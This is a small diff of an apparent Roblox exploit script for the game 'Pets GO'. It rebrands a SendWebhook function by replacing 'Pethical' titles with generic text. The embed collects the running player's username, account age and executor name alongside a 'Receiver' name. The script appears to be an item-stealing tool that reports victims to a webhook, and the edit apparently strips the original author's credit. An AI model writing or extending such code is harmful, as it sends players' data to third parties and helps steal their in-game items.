@@ -24,8 +24,8 @@ end
 
 local function SendWebhook()
     local embed = {{
-        ["title"] = "Pethical | Pets GO",
-        ["description"] = "Pethical On Top!!",
+        ["title"] = "Pets GO",
+        ["description"] = "real",
         ["color"] = 11220,
         ["fields"] = {
             {name = "```🧛‍♀️ Info```", value = "```🙍‍♂️ Username: "..LP.Name.."\n🔞 Account-Age: "..tostring(LP.AccountAge).."\n🎮 Executor: "..identifyexecutor().."\n🐱‍👤 Receiver: "..userName.."```"},
